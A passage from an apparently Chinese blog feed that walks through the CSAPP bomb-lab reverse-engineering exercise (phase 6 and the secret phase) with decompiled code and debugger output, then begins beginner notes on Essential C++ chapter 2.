class=\"number\">9</span> f</span><br><span class=\"line\"><span class=\"number\">15</span> l</span><br><span class=\"line\"><span class=\"number\">14</span> y</span><br><span class=\"line\"><span class=\"number\">5</span>  e</span><br><span class=\"line\"><span class=\"number\">6</span>  r</span><br><span class=\"line\"><span class=\"number\">7</span>  s</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后就是 x &amp; 0xf等于这个值即可,&amp;0xf的话,就是取后四位</p>\n<p>​\t\t1001 末四位为9,其余任意 以此类推<br>​\t\t1111<br>​\t\t1110<br>​\t\t0101<br>​\t\t0110<br>​\t\t0111</p>\n<p>​\t\t一种解:ionefg 解不唯一,只要末位符合即可</p>\n<h1 id=\"阶段六\"><a href=\"#阶段六\" class=\"headerlink\" title=\"阶段六\"></a>阶段六</h1><p>​\t\t读入6个整数,都小于7,且每个都不相等,不会是0和负数,因为这样话无符号数会很大,所以就是1 2 3 4 5 6</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  v1 = v15;</span><br><span class=\"line\">  read_six_numbers(a1, (__int64)v15);</span><br><span class=\"line\">  v2 = <span class=\"number\">0</span>; </span><br><span class=\"line\"><span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(*v1 - <span class=\"number\">1</span>) &gt; <span class=\"number\">5</span> )</span><br><span class=\"line\">      explode_bomb();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( ++v2 == <span class=\"number\">6</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    v3 = v2;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( *v1 == v15[v3] )</span><br><span class=\"line\">        explode_bomb();</span><br><span class=\"line\">      ++v3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( v3 &lt;= <span class=\"number\">5</span> );</span><br><span class=\"line\">    ++v1;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t注意结合顺序,这里不是读的v1-1,而是v1地址取值后-1</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(*v1 - <span class=\"number\">1</span>) &gt; <span class=\"number\">5</span> )</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t调整顺序</p>\n<p>​\t\t1 2 3 4 5 6 &#x3D;&gt;  6 5 4 3 2 1</p>\n<p>​\t\t1 3 2 4 6 5 &#x3D;&gt; 6 4 5 3 1 2</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v4 = (<span class=\"type\">char</span> *)v15;</span><br><span class=\"line\"> <span class=\"keyword\">do</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   *(_DWORD *)v4 = <span class=\"number\">7</span> - *(_DWORD *)v4;</span><br><span class=\"line\">   v4 += <span class=\"number\">4</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"keyword\">while</span> ( v4 != &amp;v16 );</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t下一步把这些数放到一个链表中,就按照数的顺序,匹配给对应的链表的结点,比如node2就匹配2,<font color=\"red\">v17数组中的顺序,就按照给定的这个顺序来</font></p>\n<p>​\t\t注意这个node是一个16位的数据,前8位代表了自己的值,后8位(v6[1])连接下一个node(指针,指向下一个node)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0LL</span>; i != <span class=\"number\">24</span>; i += <span class=\"number\">4LL</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  v8 = v15[i / <span class=\"number\">4</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v8 &lt;= <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v6 = &amp;node1;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v7 = <span class=\"number\">1</span>;</span><br><span class=\"line\">    v6 = &amp;node1;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v6 = (_QWORD *)v6[<span class=\"number\">1</span>];</span><br><span class=\"line\">      ++v7;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( v7 != v8 );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *(__int64 *)((<span class=\"type\">char</span> *)&amp;v17 + <span class=\"number\">2</span> * i) = (__int64)v6;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t举例来说,加入给定的顺序是 1 2 3 6 5 4 ,经过前面变换后得到6 5 4 1 2 3,会按照对应的顺序,找到它在链表中的结点的位置,也就是6 5 4 1 2 3,赋值给v17</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v9 = v17;</span><br><span class=\"line\">v10 = &amp;v18;</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( j = v17; ; j = v12 )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  v12 = *(_QWORD *)v10;</span><br><span class=\"line\">  *(_QWORD *)(j + <span class=\"number\">8</span>) = *(_QWORD *)v10;</span><br><span class=\"line\">  v10 += <span class=\"number\">8</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v10 == &amp;v19 )</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">*(_QWORD *)(v12 + <span class=\"number\">8</span>) = <span class=\"number\">0LL</span>;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t翻译一下,会发现,这里其实什么也没干….就是单纯为了增加思考量.</p>\n<p>​\t\t在第一次循环中,*(_QWORD *)(j + 8) &#x3D; *(_QWORD *)v10;,因为j+8就是v18,v10也是v18,相当于v18&#x3D;v18</p>\n<p>​\t\t后面的迭代这条语句也没用,因为在后面的迭代中,j &#x3D; v12 &#x3D; v10, 第一轮中v10&#x3D;v10+8, 所以在第二次迭代中,这里的语句就成了v10+8 &#x3D; v10+8, 后面也一样,每一轮的*(_QWORD *)(j + 8) &#x3D; *(_QWORD *)v10; 两边都是相等的.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v13 = <span class=\"number\">5</span>;</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  result = **(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> **)(v9 + <span class=\"number\">8</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(_DWORD *)v9 &lt; (<span class=\"type\">int</span>)result )</span><br><span class=\"line\">    explode_bomb();</span><br><span class=\"line\">  v9 = *(_QWORD *)(v9 + <span class=\"number\">8</span>);</span><br><span class=\"line\">  --v13;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( v13 );</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后来到最后一步,v9也就是v17,存储着node链表的顺序,</p>\n<p>​\t\t注意这条语句,先将v9加8,也就是获取存储的第二个node的地址,unsigned int **代表指向指针的指针类型,二级指针,因为在v9也就是v17中,存储的是一个数的指针的指针</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = **(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> **)(v9 + <span class=\"number\">8</span>);     </span><br></pre></td></tr></table></figure>\n\n<p>​\t\t看下面的例子,对这个二级指针解引用,刚开始指针指向0x6032f8,第一次解引用取得0x603300,也就是node结点的的下一个结点的地址,再解引用,得到下一个结点存储的值0x4000002b3</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; teles $rbx</span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ rbx <span class=\"number\">0x6032f0</span> (node3) ◂— <span class=\"number\">0x30000039c</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│     <span class=\"number\">0x6032f8</span> (node3+<span class=\"number\">8</span>) —▸ <span class=\"number\">0x603300</span> (node4) ◂— <span class=\"number\">0x4000002b3</span></span><br><span class=\"line\">    </span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( *(_DWORD *)v9 &lt; (<span class=\"type\">int</span>)result )</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这里的比较大小,<font color=\"red\">比较的是结点的大小</font>,需要前面的大于后面的,例如</p>\n<p>​\t\t如果是在v9中是1 2 3 4 5 6的顺序的话</p>\n<p>​\t\t取node2 , 需要node2&lt;node1</p>\n<p>​\t\t取node3 , 需要node3&lt;node2</p>\n<p>​\t\t所以要按照node的数值的大小排布一下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│         <span class=\"number\">0x7fffffffe3f0</span> —▸ <span class=\"number\">0x6032d0</span> (node1) ◂— <span class=\"number\">0x10000014c</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│         <span class=\"number\">0x7fffffffe3f8</span> —▸ <span class=\"number\">0x6032e0</span> (node2) ◂— <span class=\"number\">0x2000000a8</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│         <span class=\"number\">0x7fffffffe400</span> —▸ <span class=\"number\">0x6032f0</span> (node3) ◂— <span class=\"number\">0x30000039c</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│         <span class=\"number\">0x7fffffffe408</span> —▸ <span class=\"number\">0x603300</span> (node4) ◂— <span class=\"number\">0x4000002b3</span></span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0040</span>│     <span class=\"number\">0x7fffffffe410</span> —▸ <span class=\"number\">0x603310</span> (node5) ◂— <span class=\"number\">0x5000001dd</span></span><br><span class=\"line\"><span class=\"number\">09</span>:<span class=\"number\">0048</span>│     <span class=\"number\">0x7fffffffe418</span> —▸ <span class=\"number\">0x603320</span> (node6) ◂— <span class=\"number\">0x6000001bb</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t所以顺序应该是 (从大到小) Node 3  4 5 6 1 2 </p>\n<p>​\t\t所以经过转换后的值应该是这个,所以转换前的值是 4 3 2 1 6 5 </p>\n<p>​\t<font color=\"red\">\t可以进行爆破,排列组合就720种</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/csapp/boom/bomb# ./bomb file</span><br><span class=\"line\">Welcome to my fiendish little bomb. You have <span class=\"number\">6</span> phases with</span><br><span class=\"line\">which to blow yourself up. Have a nice day!</span><br><span class=\"line\">Phase <span class=\"number\">1</span> defused. How about the next one?</span><br><span class=\"line\">That<span class=\"number\">&#x27;</span>s number <span class=\"number\">2.</span>  Keep going!</span><br><span class=\"line\">Halfway there!</span><br><span class=\"line\">So you got that one.  Try this one.</span><br><span class=\"line\">Good work!  On to the next...</span><br><span class=\"line\"><span class=\"number\">4</span> <span class=\"number\">3</span> <span class=\"number\">2</span> <span class=\"number\">1</span> <span class=\"number\">6</span> <span class=\"number\">5</span></span><br><span class=\"line\">Congratulations! Yo<span class=\"string\">u&#x27;ve defused the bomb!</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"隐藏关卡\"><a href=\"#隐藏关卡\" class=\"headerlink\" title=\"隐藏关卡\"></a>隐藏关卡</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( num_input_strings == <span class=\"number\">6</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)__isoc99_sscanf(&amp;unk_603870, <span class=\"string\">&quot;%d %d %s&quot;</span>, &amp;v1, &amp;v2, v3) == <span class=\"number\">3</span></span><br><span class=\"line\">    &amp;&amp; !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)strings_not_equal(v3, <span class=\"string\">&quot;DrEvil&quot;</span>) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Curses, you&#x27;ve found the secret phase!&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;But finding it and solving it are quite different...&quot;</span>);</span><br><span class=\"line\">    secret_phase();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Congratulations! You&#x27;ve defused the bomb!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t可以看到,进入隐藏关卡需要num_input_strings &#x3D;&#x3D; 6,从read_line函数可以知道,这个值是每过一关+1的,所以也就是过了第六关后开启.</p>\n<p>​\t\t需要获取unk_603870处的值,并且v3需要等于DrEvil,那么我们怎么修改unk_603870的值呢?</p>\n<p>​\t\t在read_line函数中的skip函数中能够看到,我们每次输入的值,其实都是输入到了80*num_input_strings + 0x603780这个位置,</p>\n<p>​\t\t而num_input_strings是每过一关+1的,0x603870 - 0x603780 &#x3D; 240,也就是过了3关后,第四关写入的值,就写入到这里了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> *<span class=\"title function_\">skip</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v1; <span class=\"comment\">// rbx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v0 = fgets((<span class=\"type\">char</span> *)(<span class=\"number\">80LL</span> * num_input_strings + <span class=\"number\">6305664</span>), <span class=\"number\">80</span>, infile);</span><br><span class=\"line\">    v1 = v0;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v0 &amp;&amp; (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)blank_line(v0) );</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">6305664</span> = <span class=\"number\">0x603780</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t所以在第四步后面加上DrEvil就可以了7 0 DrEvil  因为在第四步求解的时候是取前两个值,所以不影响正常的解答</p>\n<p>​\t\t然后就进入下一步了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">secret_phase</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *line; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v1; <span class=\"comment\">// ebx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  line = read_line();</span><br><span class=\"line\">  v1 = strtol(line, <span class=\"number\">0LL</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 - <span class=\"number\">1</span> &gt; <span class=\"number\">0x3E8</span> )</span><br><span class=\"line\">    explode_bomb();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fun7(&amp;n1, v1) != <span class=\"number\">2</span> )</span><br><span class=\"line\">    explode_bomb();</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Wow! You&#x27;ve defused the secret stage!&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> phase_defused();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>strtol 把参数 line 所指向的字符串根据给定的 <strong>base</strong> 转换为一个长整数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">fun7</span><span class=\"params\">(__int64 a1, __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !a1 )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(_DWORD *)a1 &gt; (<span class=\"type\">int</span>)a2 )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">2</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fun7(*(_QWORD *)(a1 + <span class=\"number\">8</span>), a2);</span><br><span class=\"line\">  result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(_DWORD *)a1 != (_DWORD)a2 )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">2</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fun7(*(_QWORD *)(a1 + <span class=\"number\">16</span>), a2) + <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t最终要拿到2, 可以是2*1 所以先进入上面那个if,然后下面的if, 第三次调用fun7要得0</p>\n<p>​\t\t所以</p>\n<p>​\t\t1.a2先&lt; 0x24 然后 a1+8的值是8, </p>\n<p>​\t\t2.a2要&gt;8进入第二个分支</p>\n<p>​\t\t3.然后通过相等得到0, a1+0x16的话,就得到了0x16, 所以是0x16!</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/csapp/boom/bomb# ./bomb file</span><br><span class=\"line\">Welcome to my fiendish little bomb. You have <span class=\"number\">6</span> phases with</span><br><span class=\"line\">which to blow yourself up. Have a nice day!</span><br><span class=\"line\">Phase <span class=\"number\">1</span> defused. How about the next one?</span><br><span class=\"line\">That<span class=\"number\">&#x27;</span>s number <span class=\"number\">2.</span>  Keep going!</span><br><span class=\"line\">Halfway there!</span><br><span class=\"line\">So you got that one.  Try this one.</span><br><span class=\"line\">Good work!  On to the next...</span><br><span class=\"line\">Curses, yo<span class=\"string\">u&#x27;ve found the secret phase!</span></span><br><span class=\"line\"><span class=\"string\">But finding it and solving it are quite different...</span></span><br><span class=\"line\"><span class=\"string\">22</span></span><br><span class=\"line\"><span class=\"string\">Wow! You&#x27;</span>ve defused the secret stage!</span><br><span class=\"line\">Congratulations! Yo<span class=\"string\">u&#x27;ve defused the bomb!</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>调试文件,如果没有这个文件呢&#x2F;?</p>\n",
            "tags": [
                "csapp"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/c++%E5%85%A5%E9%97%A8-1-%E3%80%8AEssential-c++%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/",
            "url": "https://tangzichengcc.github.io/c++%E5%85%A5%E9%97%A8-1-%E3%80%8AEssential-c++%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/",
            "title": "c++入门-1-《Essential_c++》第二章 面向过程",
            "date_published": "2023-05-05T08:08:00.000Z",
            "content_html": "<h1 id=\"第二章-面向过程\"><a href=\"#第二章-面向过程\" class=\"headerlink\" title=\"第二章 面向过程\"></a>第二章 面向过程</h1><p><img src=\"/c++%E5%85%A5%E9%97%A8-1-%E3%80%8AEssential-c++%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/image-20230505161019387.png\" alt=\"image-20230505161019387\"></p>\n<p>传参数 其实除了传递值本身,另外的其实有两种,一种是传递地址(pointer),一种是传递reference</p>\n<p>???</p>\n<p><img src=\"/c++%E5%85%A5%E9%97%A8-1-%E3%80%8AEssential-c++%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/image-20230504105252376.png\" alt=\"image-20230504105252376\"></p>\n<p><img src=\"/c++%E5%85%A5%E9%97%A8-1-%E3%80%8AEssential-c++%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/image-20230504105449500.png\" alt=\"image-20230504105449500\"></p>\n<p>inline 性能和可读性</p>\n<p>重载机制: 将一组实现代码不同但工作内容相似的函数加以重载,可以让函数用户更容易使用这些函数,如果没有重载机制,就需要为每个函数提供不同的名称</p>\n<p>模版函数: 就是一些函数,功能一样,只是参数类型不一样,每一个都重写就很麻烦,模版函数可以实现将参数类型推迟绑定,绑定后生成一份函数实例</p>\n<p>模版函数也可以再进行重载</p>\n<p>函数指针有点晕,看看c那本书</p>\n<h1 id=\"章节2练习\"><a href=\"#章节2练习\" class=\"headerlink\" title=\"章节2练习\"></a>章节2练习</h1><h3 id=\"练习2-1\"><a href=\"#练习2-1\" class=\"headerlink\" title=\"练习2.1\"></a>练习2.1</h3><p><img src=\"/c++%E5%85%A5%E9%97%A8-1-%E3%80%8AEssential-c++%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/image-20230505155528071.png\" alt=\"image-20230505155528071\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">fibon_elem</span><span class=\"params\">(<span class=\"type\">int</span>,<span class=\"type\">int</span> &amp;)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> pos,elem;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;please input a position,exit:-1     &quot;</span>;</span><br><span class=\"line\">\tcin &gt;&gt; pos;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pos == <span class=\"number\">-1</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">fibon_elem</span>(pos,elem))</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;element # &quot;</span> &lt;&lt; pos &lt;&lt; <span class=\"string\">&quot;   is   